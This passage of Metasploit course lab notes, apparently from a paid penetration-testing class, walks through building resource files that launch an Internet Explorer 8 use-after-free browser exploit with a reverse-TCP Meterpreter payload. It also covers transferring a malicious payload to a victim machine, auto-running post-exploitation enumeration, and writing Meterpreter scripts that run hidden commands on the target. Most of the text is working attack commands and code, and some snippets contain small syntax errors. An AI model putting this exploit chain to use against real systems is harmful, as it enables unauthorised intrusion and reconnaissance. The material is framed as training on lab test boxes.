+Now at the command prompt, type 'sudo ./msfconsole -r meterpreter.rc' to start the msfconsole module and call/run the 'meterpreter.rc' file.
+./msfconsole -r meterpreter.rc
+ 
+- Once the msfconsole starts, the meterpreter resource file is executed and the listener is automatically setup.  It is now listening for a connection!
+ 
+- Now you must transfer the malicious meterpreter payload to the victim machine (you may do so by any means necessary, we have physical access so we transferred it via usb.
+ 
+- Click on the payload and create the meterpreter session.
+ 
+- Type 'sessions -l' to list your open sessions, and 'sessions -i 1' to indicate that you want to interact with meterpreter session under id 1.
+ 
+exit -y
+ 
+ 
+ 
+--------------------------------
+ 
+###################################
+# Getting Serious About .rc files #
+###################################
+ 
+touch /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run getcountermeasure >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run winenum >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/enum_applications >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/enum_logged_on_users >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/checkvm >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+ 
+ 
+- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
+cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+ 
+ 
+ 
+touch /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
+ 
+ 
+echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set ExitOnSession true >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set URIPATH /ie8 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set LHOST 192.168.153.159 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc                                        
+ 
+echo set AutoRunScript multi_console_command -rc /home/strategicsec/toolz/metasploit/autorun-walk-through.rc >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo exploit -j -z >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
+ 
+ 
+ 
+- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
+cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
+ 
+ 
+- Alright, enough already. Let's run this thing.
+./msfconsole -r old-faithful-ie8.rc
+ 
+ 
+################################
+# Custom Meterpreter Scripting #
+################################
+ 
+- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit can offer.  This will also show you the flexibility of the Meterpreter scripts.
+ 
+- We're going to start off with a simple Hello World script first.  
+ 
+   
+echo 'print_status("Hello World")' > /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
+ 
+ 
+- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
+ 
+- Lets test out our helloworld.rb Meterpreter script.
+ 
+ 
+meterpreter> run helloworld
+ 
+ 
+- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
+ 
+- Open /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following line.
+vi /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
+ 
+ 
+print_error("this is an error!')
+print_line("this is a line')
+ 
+- Now run the script:
+ 
+meterpreter> run helloworld
+ 
+ 
+- Now that we have the basics down, we're going to do something a little more exciting.  The architecture to follow when creating these scripts goes as follows:
+ 
+def geninfo(session)
+        begin
+        <stuff goes here>
+        rescue ::Exception => e
+        <stuff goes here>
+        end
+end
+ 
+- Copy and paste the following code into our helloworld.rb script:
+ 
+def getinfo(session)
+    begin
+       sysnfo = session.sys.config.sysinfo
+       runpriv = session.sys.config.getuid
+       print_status("Getting system information ...")
+       print_status("The target machine OS is #{sysnfo['OS']}")
+       print_status("The computer name is #{'Computer'} ")
+       print_status("Script running as #{runpriv}")
+    rescue ::Exception => e
+      print_error("The following error was encountered #{e}")
+   end
+end
+ 
+getinfo(client)
+ 
+ 
+ 
+- Now run the script:
+ 
+meterpreter> run helloworld
+ 
+ 
+- We can expand it by adding actual system commands to the script, lets look at how we can do this.
+ 
+ 
+def list_exec(session,cmdlst)
+    print_status("Running Command List ...")
+    r=''
+    session.response_timeout=120
+    cmdlst.each do |cmd|
+       begin
+          print_status "running command #{cmd}"
+          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+          while(d = r.channel.read)
+ 
+             print_status("#{d}")
+          end
+          r.channel.close
+          r.close
+       rescue ::Exception => e
+          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
+       end
+    end
+ end
+ 
+commands = [ "set",
+    "ipconfig  /all",
+    "arp -a"]
+ 
+list_exec(client,commands)
+ 
+ 
+ 
+- Run the script:
+ 
+meterpreter> run helloworld
+********************************** Day 3 Homework **********************************
+NOTE: THIS IS AN ABSOLUTE REQUIREMENT FOR YOUR CPE CREDITS
+ 
+ 
+You must create a MS WORD document titled 'FirstName-LastName-MSF-Day4.docx' (ex: Joseph-McCray-MSF-Day4.docx) that shows you completing all of the tasks covered in today's lesson.
+ 
+You must spell you name EXACTLY as you want it spelled on your class certificate.
+ 
+ 
+********************************** Day 4 Challenge **********************************
+Create a document step-by-step walkthrough (with screenshots) that shows how you created 2 autorun scripts for Metasploit
+ 
+References:
+https://sandercodes.wordpress.com/2013/02/19/meterpreter-autorunscript-example/
